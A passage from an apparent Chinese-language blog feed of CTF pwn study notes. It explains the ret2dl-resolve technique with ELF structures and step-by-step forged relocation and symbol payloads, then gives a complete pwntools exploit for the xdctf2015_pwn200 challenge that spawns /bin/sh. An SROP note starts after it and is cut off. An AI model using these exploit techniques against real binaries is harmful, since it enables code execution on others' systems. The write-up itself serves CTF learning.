<code>.symtab</code> 在<code>strip</code>之后会被删掉：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>下面的宏描述了 st_info 是怎样被解析和插入的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the st_info field.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(val)      ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure><p>当一个库函数被第一次调用时，具体动态解析过程的步骤为：</p><p>导入函数的<code>reloc_index</code>标识(一个<code>ELF_Rel</code>在 <code>.rel.plt</code>中的偏移)入栈。</p><p>然后跳转到<code>.plt</code> 段的开头,即 PLT[0]。PLT[0] 处的代码将 GOT[1] 的值压入栈中，然后跳转到 GOT[2]。 GOT[1]与GOT[2]这两个 GOT 表条目有着特殊的含义。</p><p>​    GOT[1]：一个指向内部数据结构的指针，类型是 <code>link_map</code>，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的<code>l_info</code> 域中保存了<code>.dynamic</code> 段中大多数条目的指针构成的一个数组。</p><p>​    GOT[2]：一个指向动态装载器中 <code>_dl_runtime_resolve</code> 函数的指针。</p><p>所以这步，PLT[0] 其实就是调用<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code></p><p><code>_dl_runtime_resolve</code>函数使用参数<code>link_map_obj</code>来获取解析导入函数（使用<code>reloc_index</code>参数标识）需要的信息，并将结果写到正确的 GOT 条目中。在 <code>_dl_runtime_resolve</code>解析完成后，控制流就交到了那个函数手里，而下次再调用函数的 plt 时，就会直接进入目标函数中执行。过程如下图：</p><p><img src="image-20210523114312781.png" alt="image-20210523114312781"></p><h2 id="ret2dl-resolve利用点"><a href="#ret2dl-resolve利用点" class="headerlink" title="ret2dl-resolve利用点"></a>ret2dl-resolve利用点</h2><p>ret2dl-resolve利用点主要有两个地方。</p><p>a：因为动态转载器是从<code>.dynamic</code>段的 <code>DT_STRTAB</code>条目中获得<code>.dynstr</code>段的地址的，而 <code>DT_STRTAB</code>条目的位置已知，默认情况下也可写。所以攻击者能够改写<code>DT_STRTAB</code>条目的内容，欺骗动态装载器，让它以为 <code>.dynstr</code>段在 <code>.bss</code>段中，并在那里伪造一个假的字符串表。当它尝试解析<code>printf</code> 时会使用不同的基地址来寻找函数名，最终执行的是<code>execve</code>。这种方式非常简单，但仅当二进制程序的<strong><code>.dynamic</code>段可写*</strong>时有效。</p><p>b：我们已经知道 <code>_dl_runtime_resolve</code> 的第二个参数是<code>Elf_Rel</code>条目在 <code>.rel.plt</code>段中的偏移，动态装载器将这个值加上<code>.rel.plt</code> 的基址来得到目标结构体的绝对位置。然后当传递给<code>_dl_runtime_resolve</code> 的参数 <code>reloc_index</code>超出了<code>.rel.plt</code> 段，并最终落在<code>.bss</code>段中时，攻击者可以在该位置伪造了一个<code>Elf_Rel</code>结构，并填写<code>r_offset</code>的值为一个可写的内存地址来将解析后的函数地址写在那里，同理<code>r_info</code>也会是一个将动态装载器导向到攻击者控制内存的下标。这个下标就指向一个位于它后面的 <code>Elf_Sym</code> 结构，而 <code>Elf_Sym</code>结构中的 <code>st_name</code>同样超出了 <code>.dynsym</code>段。这样这个符号就会包含一个相对于<code>.dynstr</code>地址足够大的偏移使其能够达到这个符号之后的一段内存，而那段内存里保存着这个将要调用的函数的名称。</p><p><img src="image-20210523115403901.png" alt="image-20210523115403901"></p><h2 id="手动-payload流程构造梳理"><a href="#手动-payload流程构造梳理" class="headerlink" title="手动 payload流程构造梳理"></a>手动 payload流程构造梳理</h2><p>以32位程序来梳理下过程：</p><p>第一步，对于正常函数而言我们调用动态连接的后write函数作payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">"AAAA"</span>     <span class="comment"># new ebp</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(base_addr + <span class="number">80</span>)</span><br><span class="line">payload += p32(len(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">80</span> - len(payload_2))</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">100</span> - len(payload_2))</span><br></pre></td></tr></table></figure><p>第二步，我们伪造<code>write@plt</code>，及入栈<code>reloc_index</code>和跳转PLT[0]，那么payload改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">"/bin/sh"</span></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>第三步，伪造一个 write 函数的 <code>Elf_Rel</code>结构体。</p><p>其中设置<code>r_offset</code>为<code>write@got</code>，标函数解析后的内存地址存放到该位置。</p><p><code>r_info</code>用<code>readelf -r ./bof | grep write</code>查找后照搬。动态加载器会根据这个值找到对应的<code>Elf_Sym</code></p><p><code>reloc_index</code>要调整为我们伪造 <code>Elf_Rel</code>结构体相对<code>.rel.plt</code>的偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel-&gt;r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>第四步，伪造一个 write 函数的 <code>Elf_Sym</code>结构体。</p><p>用<code>readelf -s ./bof | grep write</code> 然然后用objdump来找st_name与st_info</p><p><img src="image-20210523130030115.png" alt="image-20210523130030115"></p><p>同时，<code>Elf_Rel</code>结构体也要改变r_info可以通过<code>r_sym</code>和<code>r_type</code>计算。</p><p><code>r_sym</code>又是<code>Elf_Sym</code>相对<code>.dynsym</code>的偏移，<code>r_type</code>照搬<code>R_386_JUMP_SLOT</code>的值为0x7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment">#</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_sym=index_dynsym &lt;&lt; <span class="number">8</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info = (r_sym) | r_type</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br></pre></td></tr></table></figure><p>第五步，伪造<code>.bss</code> 上伪造<code>.dynstr</code>,放入伪造函数名<code>write</code>。相应调整st_name指向的伪造函数名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_sym=index_dynsym &lt;&lt; <span class="number">8</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info = (r_sym) | r_type</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"write\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>最后改’write’为system.</p><h2 id="例题：xdctf2015-pwn200"><a href="#例题：xdctf2015-pwn200" class="headerlink" title="例题：xdctf2015_pwn200"></a>例题：xdctf2015_pwn200</h2><p>按之前手动的分析，完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only "pop|ret"</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'bof'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>同时，我们还可以通过pwntools 的Ret2dlresolvePayload来自动完成需要手动的伪造步骤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">"./bof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bof"</span>) </span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">"system"</span>, args=[<span class="string">"/bin/sh"</span>]) </span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr) </span><br><span class="line">rop.ret2dlresolve(dlresolve) </span><br><span class="line">raw_rop = rop.chain() </span><br><span class="line">print(rop.dump())</span><br><span class="line">print(hex(dlresolve.data_addr))</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">112</span> </span><br><span class="line">payload += raw_rop </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload= dlresolve.payload</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.3_pwn_xdctf2015_pwn200.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.3_pwn_xdctf2015_pwn200.html</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a></p><p><a href="https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2021/jie-jne-jnw/exploit-jie.py" target="_blank" rel="noopener">https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2021/jie-jne-jnw/exploit-jie.py</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在做一道题时,感觉很像ret2dl-resolve能解的,但是最后发现是自己太菜理念不清搞错解题方向ret2dl-resolve并不能解。所以写文重新温习下ret2dl-resolve,防止下次踩坑。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>系统调用与SROP方法学习笔记</title>
    <link href="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-20T14:26:02.525Z</published>
    <updated>2021-05-21T04:29:39.075Z</updated>
    
    <content type="html"><![CDATA[<p>最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.<a id="more"></a></p><h2 id="SROP-特点与原理"><a href="#SROP-特点与原理" class="headerlink" title="SROP 特点与原理"></a>SROP 特点与原理</h2><h3 id="SROP-特点"><a href="#SROP-特点" class="headerlink" title="SROP 特点"></a>SROP 特点</h3><p>依赖系统调用(syscal)强但对libc.so的依赖极少。</p><p>要有空间存放Signal Frame的信息.</p><p>与其他rop相比，对的依赖gadgets 较少。</p><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>SROP手段十分依赖signal 机制.而signal 机制是类 unix 系统中进程之间相互传递信息的一种方法，也是我们平常所说的软中断或软信号中断。</p><p>1.内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。<strong>内核会为该进程保存相应的上下文，主要是将所有寄存器以及压入 signal 信息和指向 sigreturn 的系统调用地址压入栈中。</strong>我们称 ucontext 以及 siginfo 这一段为 Signal Frame(此时栈的结构如下图所示)。然后处理signal handler 的事务.<img src="image-20210520224507291.png" alt="image-20210520224507291"></p><p>处理完signal handler 的事务.程序处理完会return回<code>__restore_rt，</code>这个功能里面就是<code>mov rax, 0xf; syscall</code>，去呼叫<code>sys_rt_sigreturn</code>syscall，把一部分恢复Signal Frame通过解析 Signal Frame的信息，将压入的进程还原成中断前的状态。</p><p><img src="image-20210521095432564.png" alt="image-20210521095432564"></p><p>同时,对于signal Frame来说，不同会因为架构的不同而因此有所区别.</p><h4 id="signal-Frame-sigcontext"><a href="#signal-Frame-sigcontext" class="headerlink" title="signal Frame sigcontext"></a>signal Frame sigcontext</h4><p>在32位lunix 下sigcontext 的结构为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span 